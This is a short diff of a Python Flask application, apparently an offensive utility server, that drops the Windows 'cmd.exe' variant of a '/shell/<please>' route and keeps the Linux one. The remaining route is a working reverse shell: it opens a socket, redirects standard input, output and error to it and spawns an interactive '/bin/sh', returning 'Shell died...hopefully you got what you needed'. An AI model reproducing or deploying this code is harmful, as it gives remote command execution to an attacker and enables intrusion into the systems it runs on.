@@ -30,8 +30,6 @@ def top():
 
 @app.route('/shell')
 @app.route('/shell/<please>')
-@app.route('/winshell')
-@app.route('/winshell/<please>')
 def shell(please=None):
     if please:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -39,10 +37,7 @@ def shell(please=None):
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
-        if request.path.startswith('/shell'):
-            subprocess.call(["/bin/sh", "-i"])
-        else:
-            subprocess.call(["cmd.exe"])
+        subprocess.call(["/bin/sh", "-i"])
         return '<p>Shell died...hopefully you got what you needed</p>'
     else:
         return render_template('please.html')
